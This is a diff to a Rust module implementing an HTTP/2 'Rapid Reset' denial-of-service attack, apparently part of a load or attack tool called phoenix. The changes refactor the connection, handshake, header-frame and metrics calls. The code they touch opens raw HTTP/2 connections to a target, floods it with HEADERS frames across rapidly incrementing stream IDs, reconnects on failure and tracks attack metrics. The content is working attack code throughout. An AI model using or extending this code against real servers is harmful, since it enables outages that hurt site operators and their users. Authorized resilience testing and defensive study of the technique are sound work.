@@ -16,6 +16,7 @@
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
+use async_trait::async_trait;
 use anyhow::Context;
 use bytes::Bytes;
 use governor::{RateLimiter, Quota};
@@ -23,6 +24,7 @@ use phoenix_core::{RawH2Connection, frame::minimal_hpack_get_request};
 use phoenix_metrics::AttackMetrics;
 use tokio::task::JoinSet;
 use tracing::{info, warn, error};
+use url::Url;
 
 use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target, create_rate_limiter};
 
@@ -72,7 +74,7 @@ impl RapidResetAttack {
         target_host: String,
         target_port: u16,
         connection_id: usize,
-        rate_limiter: Option<Arc<RateLimiter>>,
+        rate_limiter: Option<Arc<governor::RateLimiter<governor::state::NotKeyed, governor::state::InMemoryState, governor::clock::QuantaClock>>>,
         metrics: Arc<AttackMetrics>,
         start_time: Instant,
         duration: Duration,
@@ -80,8 +82,11 @@ impl RapidResetAttack {
         let mut total_requests = 0u64;
         let mut errors = 0u64;
         
-        // Connect to target
-        let mut connection = match RawH2Connection::connect(&target_host, target_port).await {
+        // Connect to target - construct URL from host and port
+        let url_str = format!("https://{}:{}", target_host, target_port);
+        let url = Url::parse(&url_str).map_err(|e| AttackError::Config(format!("Invalid URL: {}", e)))?;
+        
+        let mut connection = match RawH2Connection::connect(&url).await {
             Ok(conn) => conn,
             Err(e) => {
                 error!("Connection {} failed to connect: {}", connection_id, e);
@@ -92,7 +97,7 @@ impl RapidResetAttack {
         info!("Connection {} established to {}:{}", connection_id, target_host, target_port);
         
         // Perform TLS and HTTP/2 handshake
-        if let Err(e) = connection.handshake().await {
+        if let Err(e) = connection.perform_handshake().await {
             error!("Connection {} handshake failed: {}", connection_id, e);
             return Ok((0, 1));
         }
@@ -113,14 +118,7 @@ impl RapidResetAttack {
             next_stream_id = next_stream_id.wrapping_add(2);
             
             // Build minimal GET request headers
-            let headers_frame = match minimal_hpack_get_request(stream_id, &target_host, "/") {
-                Ok(frame) => frame,
-                Err(e) => {
-                    error!("Failed to build headers frame: {}", e);
-                    errors += 1;
-                    continue;
-                }
-            };
+            let headers_frame = minimal_hpack_get_request(&target_host, "/").into();
             
             // Send HEADERS frame (end_stream=false, end_headers=true)
             if let Err(e) = connection.send_frame(headers_frame).await {
@@ -128,10 +126,19 @@ impl RapidResetAttack {
                 errors += 1;
                 
                 // Try to reconnect
-                match RawH2Connection::connect(&target_host, target_port).await {
+                let url_str = format!("https://{}:{}", target_host, target_port);
+                let url = match Url::parse(&url_str) {
+                    Ok(url) => url,
+                    Err(e) => {
+                        error!("Invalid URL during reconnection: {}", e);
+                        return Ok((total_requests, errors));
+                    }
+                };
+                
+                match RawH2Connection::connect(&url).await {
                     Ok(new_conn) => {
                         connection = new_conn;
-                        if let Err(e) = connection.handshake().await {
+                        if let Err(e) = connection.perform_handshake().await {
                             error!("Reconnection handshake failed: {}", e);
                             break;
                         }
@@ -155,7 +162,7 @@ impl RapidResetAttack {
             }
             
             total_requests += 1;
-            metrics.increment_requests();
+            metrics.record_request(0, true, 0).await;
             
             // Small yield to prevent starving the runtime
             if total_requests % 1000 == 0 {
@@ -264,7 +271,7 @@ impl Attack for RapidResetAttack {
         }
         
         let actual_duration = start_time.elapsed();
-        let snapshot = metrics.snapshot();
+        let snapshot = metrics.snapshot().await;
         
         info!("Attack completed: {} requests, {} errors, duration: {:?}", 
               total_requests, total_errors, actual_duration);
